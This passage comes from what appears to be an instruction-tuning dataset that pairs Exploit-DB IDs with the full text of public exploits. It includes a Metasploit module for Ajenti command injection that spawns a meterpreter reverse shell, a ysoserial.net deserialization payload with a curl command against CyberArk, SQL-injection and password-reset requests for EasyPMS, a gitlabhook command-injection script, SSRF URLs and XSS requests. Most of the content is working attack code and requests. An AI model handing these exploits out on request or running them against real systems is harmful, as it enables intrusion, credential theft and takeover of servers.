correct path for the shell file.\")\n\noutput_file = \"exploit.zip\"\n\npackage = zipfile.ZipFile(output_file, 'w')\npackage.writestr('package.xml', package_xml.format(filename=os.path.basename(args.shell), upload_path=args.upload_path))\npackage.writestr(os.path.basename(args.shell), open(args.shell, 'r').read())\npackage.close()\n\nprint(f\"[DONE] Created Umbraco package: {output_file}\")"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 50462",
        "output": {
            "ID": "50462",
            "File": "exploits/aspx/webapps/50462.txt",
            "Description": "Umbraco v8.14.1 - 'baseUrl' SSRF",
            "Date Published": "2021-10-29",
            "Author": "NgoAnhDuc",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "",
            "Date Added": "2021-10-29",
            "Date Updated": "2021-10-29",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Umbraco v8.14.1 - 'baseUrl' SSRF\n# Date: July 5, 2021\n# Exploit Author: NgoAnhDuc\n# Vendor Homepage: https://our.umbraco.com/\n# Software Link: https://our.umbraco.com/download/releases/8141\n# Version: v8.14.1\n# Affect: Umbraco CMS v8.14.1, Umbraco Cloud\n\nVulnerable code:\n\nUmbraco.Web.Editors.HelpController.GetContextHelpForPage():\nhttps://github.com/umbraco/Umbraco-CMS/blob/710ecf2537a8630d00db793877d5c169c5cf8095/src/Umbraco.Web/Editors/HelpController.cs#L14\nUmbraco.Web.Editors.DashboardController.GetRemoteDashboardContent():\nhttps://github.com/umbraco/Umbraco-CMS/blob/710ecf2537a8630d00db793877d5c169c5cf8095/src/Umbraco.Web/Editors/DashboardController.cs#L50\nUmbraco.Web.Editors.DashboardController.GetRemoteDashboardCss():\nhttps://github.com/umbraco/Umbraco-CMS/blob/710ecf2537a8630d00db793877d5c169c5cf8095/src/Umbraco.Web/Editors/DashboardController.cs#L91\n\nPoC:\n\n/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=https://SSRF-HOST.EXAMPLE\n/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=\nhttps://SSRF-HOST.EXAMPLE/\n/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=https://SSRF-HOST.EXAMPLE/\n\nNotes:\n- There's no \"/\" suffix in payload 1\n- \"/\" suffix is required in payload 2 and payload 3\n- \"section\" parameter value must be changed each exploit attempt"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47560",
        "output": {
            "ID": "47560",
            "File": "exploits/json/webapps/47560.rb",
            "Description": "Ajenti 2.1.31 - Remote Code Exection (Metasploit)",
            "Date Published": "2019-10-30",
            "Author": "Onur ER",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2019-10-30",
            "Date Updated": "2019-10-31",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Metasploit Framework (MSF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Ajenti 2.1.31 - Remote Code Exection (Metasploit)\n# Date: 2019-10-29\n# Exploit Author: Onur ER\n# Vendor Homepage: http://ajenti.org/\n# Software Link: https://github.com/ajenti/ajenti\n# Version: 2.1.31\n# Tested on: Ubuntu 19.10\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n                      'Name'            => \"Ajenti 2.1.31 Remote Code Execution\",\n                      'Description'     => %q{\n                        This module exploits a command injection in Ajenti <= 2.1.31.\n                        By injecting a command into the username POST parameter to api/core/auth, a shell can be spawned.\n                      },\n                      'Author'          => [\n                          'Jeremy Brown', # Vulnerability discovery\n                          'Onur ER <onur@onurer.net>' # Metasploit module\n                      ],\n                      'References'      => [\n                          ['EDB', '47497']\n                      ],\n                      'DisclosureDate'  => '2019-10-14',\n                      'License'         => MSF_LICENSE,\n                      'Platform'        => 'python',\n                      'Arch'            => ARCH_PYTHON,\n                      'Privileged'      => false,\n                      'Targets'         => [\n                          [ 'Ajenti <= 2.1.31', {} ]\n                      ],\n                      'DefaultOptions'  =>\n                          {\n                              'RPORT'   => 8000,\n                              'SSL'     => 'True',\n                              'payload' => 'python/meterpreter/reverse_tcp'\n                          },\n                      'DefaultTarget'   => 0\n          ))\n    register_options([\n                         OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n                               'method' => 'GET',\n                               'uri'    => \"/view/login/normal\"\n                           })\n    if res and res.code == 200\n      if res.body =~ /'ajentiVersion', '2.1.31'/\n        return Exploit::CheckCode::Vulnerable\n      elsif res.body =~ /Ajenti/\n        return Exploit::CheckCode::Detected\n      end\n    end\n    vprint_error(\"Unable to determine due to a HTTP connection timeout\")\n    return Exploit::CheckCode::Unknown\n  end\n\n\n  def exploit\n    print_status(\"Exploiting...\")\n    random_password = rand_text_alpha_lower(7)\n    json_body = { 'username' => \"`python -c \\\"#{payload.encoded}\\\"`\",\n                  'password' => random_password,\n                  'mode' => 'normal'\n    }\n    res = send_request_cgi({\n         'method' => 'POST',\n         'uri'    => normalize_uri(target_uri, 'api', 'core', 'auth'),\n         'ctype'  => 'application/json',\n         'data'   => JSON.generate(json_body)\n     })\n  end\nend"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48003",
        "output": {
            "ID": "48003",
            "File": "exploits/json/webapps/48003.txt",
            "Description": "AVideo Platform 8.1 - Cross Site Request Forgery (Password Reset)",
            "Date Published": "2020-02-05",
            "Author": "Ihsan Sencan",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2020-02-05",
            "Date Updated": "2020-02-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: AVideo Platform 8.1 - Cross Site Request Forgery (Password Reset)\n# Dork: N/A\n# Date: 2020-02-05\n# Exploit Author: Ihsan Sencan\n# Vendor Homepage: https://avideo.com\n# Software Link: https://github.com/WWBN/AVideo\n# Version: 8.1\n# Tested on: Linux\n# CVE: N/A\n\n# POC:\n# 1)\n# http://localhost/[PATH]/objects/playlistsFromUser.json.php?users_id=[ID]\n#\n................\n0\nid\t92\nuser\t\"admin\"\nname\t\"Watch Later\"\nemail\t\"user@localhost\"\npassword\t\"bc79a173cc20f0897db1c5b004588db9\"\ncreated\t\"2019-05-16 21:42:42\"\nmodified\t\"2019-05-16 21:42:42\"\nisAdmin\t1\nstatus\t\"watch_later\"\nphotoURL\t\"videos/userPhoto/photo1.png\"\nlastLogin\t\"2020-02-03 08:11:08\"\nrecoverPass\t\"0ce70c7b006c78552fee993adeaafadf\"\n................\n#\n# Password recovery can be done using recoverPass.\n# http://localhost/[PATH]/recoverPass?user=admin&recoverpass=0ce70c7b006c78552fee993adeaafadf\n#"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47997",
        "output": {
            "ID": "47997",
            "File": "exploits/json/webapps/47997.txt",
            "Description": "AVideo Platform 8.1 - Information Disclosure (User Enumeration)",
            "Date Published": "2020-02-05",
            "Author": "Ihsan Sencan",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2020-02-05",
            "Date Updated": "2020-02-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: AVideo Platform 8.1 - Information Disclosure (User Enumeration)\n# Dork: N/A\n# Date: 2020-02-05\n# Exploit Author: Ihsan Sencan\n# Vendor Homepage: https://avideo.com\n# Software Link: https://github.com/WWBN/AVideo\n# Version: 8.1\n# Tested on: Linux\n# CVE: N/A\n\n# POC:\n# 1)\n# http://localhost/[PATH]/objects/playlistsFromUser.json.php?users_id=[ID]\n#\n................\n0\nid\t92\nuser\t\"admin\"\nname\t\"Watch Later\"\nemail\t\"user@localhost\"\npassword\t\"bc79a173cc20f0897db1c5b004588db9\"\ncreated\t\"2019-05-16 21:42:42\"\nmodified\t\"2019-05-16 21:42:42\"\nisAdmin\t1\nstatus\t\"watch_later\"\nphotoURL\t\"videos/userPhoto/photo1.png\"\nlastLogin\t\"2020-02-03 08:11:08\"\nrecoverPass\t\"0ce70c7b006c78552fee993adeaafadf\"\n................\n#\n# Hash function to be converted ....\n#\nfunction encryptPassword($password, $noSalt = false) {\n    global $advancedCustom, $global, $advancedCustomUser;\n    if (!empty($advancedCustomUser->encryptPasswordsWithSalt) && !empty($global['salt']) && empty($noSalt)) {\n        $password .= $global['salt'];\n    }\n\n    return md5(hash(\"whirlpool\", sha1($password)));\n}\n#"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 44429",
        "output": {
            "ID": "44429",
            "File": "exploits/json/webapps/44429.txt",
            "Description": "CyberArk Password Vault Web Access < 9.9.5 / < 9.10 / 10.1 - Remote Code Execution",
            "Date Published": "2018-04-09",
            "Author": "RedTeam Pentesting",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2018-04-09",
            "Date Updated": "2018-04-09",
            "Verified": "0",
            "Codes": [
                "CVE-2018-9843"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Advisory: CyberArk Password Vault Web Access Remote Code Execution\n\nThe CyberArk Password Vault Web Access application uses authentication\ntokens which consist of serialized .NET objects. By crafting manipulated\ntokens, attackers are able to gain unauthenticated remote code execution\non the web server.\n\n\nDetails\n=======\n\nProduct: CyberArk Password Vault Web Access\nAffected Versions: < 9.9.5, < 9.10, 10.1\nFixed Versions: 9.9.5, 9.10, 10.2\nVulnerability Type: Remote Code Execution\nSecurity Risk: high\nVendor URL: https://www.cyberark.com/\nVendor Status: fixed version released\nAdvisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-014\nAdvisory Status: published\nCVE: CVE-2018-9843\nCVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9843\n\n\nIntroduction\n============\n\n\"CyberArk Enterprise Password Vault is designed to secure, rotate and\ncontrol access to privileged account credentials based on organizational\npolicies. A flexible architecture allows organizations to start small\nand scale to the largest, most complex IT environments. The solution\nprotects privileged account credentials used to access the vast majority\nof systems.\"\n(from the Enterprise Password Vault Data Sheet [1])\n\n\nMore Details\n============\n\nThe CyberArk Password Vault provides secure storage for credentials. It\nmay be accessed through various clients which are also provided by\nCyberArk. One such client is the CyberArk Password Vault Web Access, a\n.NET web application. After logging into the web application with their\ncredentials, users may access credentials kept in the vault.\nAdditionally, CyberArk Password Vault Web Access provides a REST API for\nprogrammatic access to the vault. This API is available at an URL\nsimilar to the following:\n\nhttps://10.0.0.6/PasswordVault/WebServices/\n\nThe API provides multiple endpoints with different methods.\nMost methods provided by the API require prior authentication.\nConsequently, a user's API call must include an authentication token in\nan HTTP authorization header. Tokens may be generated by calling a\ndedicated \"Logon\" API method.\n\nAnalysis of this token by RedTeam Pentesting revealed, that it consists\nof a base64 encoded, serialized .NET object of the type\n\"CyberArk.Services.Web.SessionIdentifiers\".  This class consists of four\nstring attributes which hold information about a user's session. The\nintegrity of the serialized data is not protected. Therefore, attackers\nmay send arbitrary .NET objects to the API in the authorization header.\nBy leveraging certain gadgets, such as the ones provided by\nysoserial.net [2], attackers may execute arbitrary code in the context\nof the web application.\n\n\nProof of Concept\n================\n\nFirst, a malicious serialized .NET object is created. Here the\n\"TypeConfuseDelegate\" gadget of ysoserial.net is used to execute the\n\"ping\" command:\n\n------------------------------------------------------------------------\n$ ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \\\n  -c \"ping 10.0.0.19\" > execute-ping.txt\n\n$ cat execute-ping.txt\nAAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVy\nZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3Rl\nbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2Nv\ncmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2Vu\nPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwAD\nAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtb\nU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0\ncmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIA\nAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29t\ncGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs\ndHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19j\nb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAA\nAAIAAAAGBgAAABEvYyBwaW5nIDEwLjAuMC4xOQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxl\nZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMD\nAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lz\ndGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJl\nZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAE\nCAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkH\nAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBl\nTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl\ncmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tT\neXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy\nYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBt\nc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRv\na2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lz\ndGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49\nYjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs\ndHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5\nc3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2Vu\nPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAA\nBVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXph\ndGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpT\naWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5U\neXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBT\ndGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9z\ndGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoB\nCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50\nMzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5J\nbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgA\nAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwg\nVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1\nYzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL\n------------------------------------------------------------------------\n\nNext, an API call is invoked which includes the malicious .NET object in\nits authorization header. This is done with cURL [3] as follows:\n\n------------------------------------------------------------------------\n$ curl -s -X GET -k \\\n  --url 'https://10.0.0.6/PasswordVault/WebServices/PIMServices.svc/'\\\n  'Applications/?Location=\\&IncludeSublocations=true' \\\n  --header \"authorization: $(cat execute-ping.txt)\" \\\n  --header 'content-type: application/json'\n------------------------------------------------------------------------\n\nSimultaneously, tcpdump [4] is invoked on the host 10.0.0.19 to listen\nfor ICMP packets originating from the web server:\n\n------------------------------------------------------------------------\n$ sudo tcpdump -i enp0s25 icmp\ntcpdump: verbose output suppressed[...]\nlistening on enp0s25[...]\n\nIP 10.0.0.6 > 10.0.0.19: ICMP echo request, id 1, seq 6, length 40\nIP 10.0.0.19 > 10.0.0.6: ICMP echo reply, id 1, seq 6, length 40\n------------------------------------------------------------------------\n\nThe fact that ICMP packets are received from the web server, indicates\nthat attacker-controlled code was executed.\n\n\nWorkaround\n==========\n\nDisable any access to the API at the route /PasswordVault/WebServices.\n\n\nFix\n===\n\nUpgrade CyberArk Password Vault Web Access to version 9.9.5, 9.10 or\n10.2.\n\n\nSecurity Risk\n=============\n\nThe risk of this vulnerability is rated as high. Attackers with access\nto the PrivateArk Vault Web Access REST API may execute arbitrary code\non the web server. No credentials are required. Attackers gain access to\nthe system with the privileges of the web application. Consequently,\nsuch access may be used to backdoor the web application and compromise\nfurther accounts and credentials. Additionally, attackers may pivot from\nthe web server to attack the vault directly.\n\n\nTimeline\n========\n\n2017-11-24 Vulnerability identified\n2018-01-22 Customer approved disclosure to vendor\n2018-02-05 Vendor notified\n2018-02-28 Vendor released fixed version\n2018-04-06 CVE number requested\n2018-04-07 CVE number assigned\n2018-04-09 Advisory released\n\n\nReferences\n==========\n\n[1] http://lp.cyberark.com/rs/316-CZP-275/images/ds-enterprise-password-vault-11-15-17.pdf\n[2] https://github.com/pwntester/ysoserial.net\n[3] https://curl.haxx.se/\n[4] https://www.tcpdump.org/\n\n\nRedTeam Pentesting GmbH\n=======================\n\nRedTeam Pentesting offers individual penetration tests performed by a\nteam of specialised IT-security experts. Hereby, security weaknesses in\ncompany networks or products are uncovered and can be fixed immediately.\n\nAs there are only few experts in this field, RedTeam Pentesting wants to\nshare its knowledge and enhance the public knowledge with research in\nsecurity-related areas. The results are made available as public\nsecurity advisories.\n\nMore information about RedTeam Pentesting can be found at:\nhttps://www.redteam-pentesting.de/\n\n\nWorking at RedTeam Pentesting\n=============================\n\nRedTeam Pentesting is looking for penetration testers to join our team\nin Aachen, Germany. If you are interested please visit:\nhttps://www.redteam-pentesting.de/jobs/\n\n-- RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Dennewartstr. 25-27 Fax : +49 241 510081-99 52068 Aachen https://www.redteam-pentesting.de Germany Registergericht: Aachen HRB 14004 Gesch\u00e4ftsf\u00fchrer: Patrick Hof, Jens Liebchen"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48858",
        "output": {
            "ID": "48858",
            "File": "exploits/json/webapps/48858.txt",
            "Description": "EasyPMS 1.0.0 - Authentication Bypass",
            "Date Published": "2020-10-06",
            "Author": "Jok3r",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2020-10-06",
            "Date Updated": "2020-10-06",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: EasyPMS 1.0.0 - Authentication Bypass\n# Discovery by: Jok3r\n# Vendor Homepage: https://www.elektraweb.com/en/\n# Software Link: https://github.com/Travelaps/EasyPMS/releases/\n# Tested Version: 1.0.0\n# Vulnerability Type: Authentication Bypass\n# Tested on OS: Windows Server 2012\n\n#Description:\n\nEasyPMS has authentication bypass vulnerability that low privilege user can escalate privilege to HotelOwner admin privilege.\n\nSteps to Reproduce:\n\n1)\nUnprivileged user can manipulate sql query within json request format. Admin user code can be obtained using single quote after ID column so\nthat where clause is invalid.\n\nFirst Request:\n\nPOST /Select/STDUSER HTTP/1.1\nHost: target\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://target/app/record/user-profile;index=$ANG.STDUSERID\nContent-Type: text/plain\nContent-Length: 689\nOrigin: https://target\nConnection: close\n\n\n\n{\"Action\":\"Select\",\"Object\":\"STDUSER\",\"Select\":[\"ID\",\"USERCODE\",\"PASSWORD\",\"EMAIL\",\"LASTNAME\",\"GSM\",\"PHONE\",\"HOTELID\",\"FIRSTNAME\",\"PINCODE\"],\"Where\":[{\"Column\":\"ID'\",\"Operator\":\"=\",\"Value\":\"80403\"},{\"Column\":\"HOTELID\",\"Operator\":\"=\",\"Value\":22330}],\"Paging\":{\"Current\":1,\"ItemsPerPage\":3},\"LoginToken\":\"token_value\"}\n\n\n\n2)\nWhile user is sending password resetting request, can change password of Admin user that is inside HotelOwner privilege class.\nBecause there is not validation of token and user has write permission on STDUSER table so admin user password can be changed by unprivileged user that obtains ID of admin user\nsending first request.\n\n\n\nSecond Request:\n\nPOST / HTTP/1.1\nHost: target\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://target/login\nContent-Type: text/plain\nContent-Length: 128\nOrigin: https://target\nConnection: close\n\n\n{\"Row\":{\"PASSWORD\":\"Qw12344.\",\"ID\":\"80401\",\"HOTELID\":22330},\"SelectAfterUpdate\":[\"ID\"],\"Action\":\"Update\",\"Object\":\"STDUSER\"}\n\n\n\n\n\n\n# Timeline:\n# 01.10.2020 - issue was discovered\n# 02.10.2020 - notify to vendor\n# 02.10.2020 - vendor fixed"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42579",
        "output": {
            "ID": "42579",
            "File": "exploits/json/webapps/42579.txt",
            "Description": "NethServer 7.3.1611 - Cross-Site Request Forgery / Cross-Site Scripting",
            "Date Published": "2017-08-28",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2017-08-29",
            "Date Updated": "2017-08-29",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "NethServer 7.3.1611 (Upload.json) CSRF Script Insertion Vulnerability\n\n\nVendor: NethServer.org\nProduct web page: https://www.nethserver.org\nAffected version: 7.3.1611-u1-x86_64\n\nSummary: NethServer is an operating system for the Linux enthusiast,\ndesigned for small offices and medium enterprises. It's simple, secure\nand flexible.\n\nDesc: NethServer suffers from an authenticated stored XSS vulnerability.\nInput passed to the 'BackupConfig[Upload][Description]' POST parameter is\nnot properly sanitised before being returned to the user. This can be exploited\nto execute arbitrary HTML and script code in a user's browser session in\ncontext of an affected site.\n\nTested on: Kernel 3.10.0.-514.el7.x86_64 on an x86_64\n           CentOS Linux 7.3.1611 (Core)\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2017-5432\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5432.php\n\n\n16.08.2017\n\n--\n\n\nPoC request:\n\nPOST /en-US/BackupConfig/Upload.json HTTP/1.1\nHost: 172.19.0.195:980\nConnection: close\nContent-Length: 15762\nAccept: */*\nOrigin: https://172.19.0.195:980\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary8FfEu2Tn6fUOnT80\nReferer: https://172.19.0.195:980/en-US/BackupConfig\nAccept-Language: en-US,en;q=0.8,mk;q=0.6\nCookie: nethgui=4igflab8fmbi5aq26pvsp5r0f2\n\n------WebKitFormBoundary8FfEu2Tn6fUOnT80\nContent-Disposition: form-data; name=\"arc\"; filename=\"backup-config.7z.xz\"\nContent-Type: application/x-xz\n\n[xz content omitted]\n------WebKitFormBoundary8FfEu2Tn6fUOnT80\nContent-Disposition: form-data; name=\"BackupConfig[Upload][Description]\"\n\n<script>confirm(017)</script>\n------WebKitFormBoundary8FfEu2Tn6fUOnT80--"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47420",
        "output": {
            "ID": "47420",
            "File": "exploits/json/webapps/47420.txt",
            "Description": "NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution",
            "Date Published": "2019-09-25",
            "Author": "Semen Alexandrovich Lyhin",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2019-09-25",
            "Date Updated": "2019-09-25",
            "Verified": "0",
            "Codes": [
                "CVE-2019-5485"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution\n# Date: 2019-09-13\n# Exploit Author: Semen Alexandrovich Lyhin\n# Vendor Homepage: https://www.npmjs.com/package/gitlabhook\n# Version: 0.0.17\n# Tested on: Kali Linux 2, Windows 10.\n# CVE : CVE-2019-5485\n\n#!/usr/bin/python\n\nimport requests\n\ntarget = \"http://TARGET:3420\"\ncmd = r\"touch /tmp/poc.txt\"\njson = '{\"repository\":{\"name\": \"Diasporrra\\'; %s;\\'\"}}'% cmd\nr = requests.post(target, json)\n\nprint \"Done.\""
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48360",
        "output": {
            "ID": "48360",
            "File": "exploits/json/webapps/48360.txt",
            "Description": "NSClient++ 0.5.2.35 - Authenticated Remote Code Execution",
            "Date Published": "2020-04-21",
            "Author": "kindredsec",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2020-04-21",
            "Date Updated": "2020-04-21",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
